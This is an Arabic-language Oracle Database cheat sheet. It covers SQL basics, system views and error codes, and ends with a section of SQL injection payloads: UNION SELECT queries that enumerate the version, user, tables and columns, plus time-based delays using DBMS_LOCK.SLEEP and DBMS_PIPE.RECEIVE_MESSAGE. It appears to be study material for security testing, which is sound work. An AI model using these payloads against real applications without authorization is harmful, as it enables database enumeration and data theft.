# Oracle Database Cheat Sheet 

---

# معلومات عامة

- الشركة: **Oracle Corporation**
    
- النوع: Relational Database Management System (RDBMS)
    
- الاستخدام:
    
    - البنوك
        
    - شركات الاتصالات
        
    - المستشفيات
        
    - الهيئات الحكومية
        
    - الأنظمة الضخمة (Enterprise)
        

---

# أهم اختلاف عن MySQL

في MySQL:

```sql
SELECT 1;
```

في Oracle:

```sql
SELECT 1 FROM dual;
```

> **DUAL** هو جدول خاص موجود دائمًا في Oracle ويستخدم عند تنفيذ استعلام لا يعتمد على جدول.

---

# معرفة النسخة

```sql
SELECT banner FROM v$version;
```

أو

```sql
SELECT * FROM v$version;
```

---

# معرفة المستخدم الحالي

```sql
SELECT USER FROM dual;
```

أو

```sql
SELECT SYS_CONTEXT('USERENV','SESSION_USER') FROM dual;
```

---

# معرفة اسم قاعدة البيانات

```sql
SELECT global_name FROM global_name;
```

---

# معرفة اسم السيرفر

```sql
SELECT SYS_CONTEXT('USERENV','SERVER_HOST') FROM dual;
```

---

# معرفة اسم الـ Schema الحالي

```sql
SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA') FROM dual;
```

---

# معرفة الوقت والتاريخ

```sql
SELECT SYSDATE FROM dual;
```

---

# معرفة إصدار Oracle

```sql
SELECT banner FROM v$version;
```

---

# عرض جميع الجداول الخاصة بالمستخدم

```sql
SELECT table_name
FROM user_tables;
```

---

# عرض جميع الجداول المسموح لك برؤيتها

```sql
SELECT table_name
FROM all_tables;
```

---

# عرض جميع الجداول (يتطلب صلاحيات DBA)

```sql
SELECT table_name
FROM dba_tables;
```

---

# عرض أسماء الأعمدة

```sql
SELECT column_name
FROM all_tab_columns;
```

---

# عرض أعمدة جدول معين

```sql
SELECT column_name
FROM all_tab_columns
WHERE table_name='USERS';
```

> **ملاحظة:** في Oracle أسماء الجداول غالبًا تكون بحروف كبيرة (Uppercase).

---

# معرفة أسماء الـ Schemas

```sql
SELECT username
FROM all_users;
```

---

# عدد الجداول

```sql
SELECT COUNT(*)
FROM user_tables;
```

---

# عرض البيانات

```sql
SELECT *
FROM users;
```

---

# عرض أول 10 صفوف

```sql
SELECT *
FROM users
FETCH FIRST 10 ROWS ONLY;
```

أو في الإصدارات القديمة:

```sql
SELECT *
FROM users
WHERE ROWNUM <= 10;
```

---

# البحث داخل جدول

```sql
SELECT *
FROM users
WHERE username='admin';
```

---

# إدراج بيانات

```sql
INSERT INTO users(id,name)
VALUES(1,'Ahmed');
```

---

# تعديل بيانات

```sql
UPDATE users
SET password='123456'
WHERE id=1;
```

---

# حذف بيانات

```sql
DELETE FROM users
WHERE id=1;
```

---

# إنشاء جدول

```sql
CREATE TABLE users(
id NUMBER,
username VARCHAR2(100)
);
```

---

# حذف جدول

```sql
DROP TABLE users;
```

---

# إنشاء مستخدم

```sql
CREATE USER fares
IDENTIFIED BY 123456;
```

---

# إعطاء صلاحيات

```sql
GRANT CONNECT TO fares;
```

---

# التعليقات (Comments)

```sql
--
```

مثال:

```sql
SELECT * FROM users--
```

---

# لا يدعم

```sql
#
```

---

# أهم Functions

## المستخدم الحالي

```sql
USER
```

---

## التاريخ

```sql
SYSDATE
```

---

## الوقت الحالي (Timestamp)

```sql
SYSTIMESTAMP
```

---

## طول النص

```sql
LENGTH()
```

---

## جزء من النص

```sql
SUBSTR()
```

---

## تحويل لحروف كبيرة

```sql
UPPER()
```

---

## تحويل لحروف صغيرة

```sql
LOWER()
```

---

## دمج النصوص

```sql
||
```

مثال:

```sql
SELECT 'Hello ' || USER
FROM dual;
```

---

# Time-Based SQL Injection

```sql
DBMS_LOCK.SLEEP(5)
```

أو

```sql
DBMS_PIPE.RECEIVE_MESSAGE('A',5)
```

---

# أشهر جداول Oracle

|الجدول|الوظيفة|
|---|---|
|DUAL|جدول وهمي لتنفيذ الاستعلامات|
|USER_TABLES|جداول المستخدم الحالي|
|ALL_TABLES|جميع الجداول المسموح بها|
|DBA_TABLES|جميع الجداول (DBA)|
|ALL_TAB_COLUMNS|أسماء الأعمدة|
|ALL_USERS|جميع المستخدمين|
|V$VERSION|معلومات النسخة|

---

# أشهر رسائل الخطأ

```text
ORA-00933
```

خطأ في صياغة SQL.

---

```text
ORA-01756
```

خطأ في علامات الاقتباس (Quotes).

---

```text
ORA-00942
```

الجدول أو الـ View غير موجود.

---

```text
ORA-00904
```

اسم عمود غير صحيح.

---

```text
ORA-01017
```

اسم المستخدم أو كلمة المرور غير صحيحة.

---

# أشهر Payloads في SQL Injection

اختبار وجود SQLi:

```sql
'
```

```sql
''
```

---

التعليق:

```sql
--
```

---

معرفة النسخة:

```sql
UNION SELECT banner,NULL FROM v$version--
```

---

معرفة المستخدم الحالي:

```sql
UNION SELECT USER,NULL FROM dual--
```

---

استخراج أسماء الجداول:

```sql
UNION SELECT table_name,NULL
FROM all_tables--
```

---

استخراج أسماء الأعمدة:

```sql
UNION SELECT column_name,NULL
FROM all_tab_columns
WHERE table_name='USERS'--
```

---

# أشياء يجب حفظها

✅ Oracle تحتاج غالبًا إلى:

```sql
FROM dual
```

✅ لا تدعم:

```sql
#
```

✅ تدعم:

```sql
--
```

✅ رسائل الأخطاء تبدأ بـ:

```text
ORA-
```

✅ عرض النسخة يتم من:

```sql
v$version
```

✅ أسماء الجداول من:

```sql
all_tables
```

✅ أسماء الأعمدة من:

```sql
all_tab_columns
```

✅ المستخدم الحالي:

```sql
USER
```

✅ الوقت الحالي:

```sql
SYSDATE
```

✅ التأخير الزمني:

```sql
DBMS_LOCK.SLEEP()
```

أو

```sql
DBMS_PIPE.RECEIVE_MESSAGE()
```


---
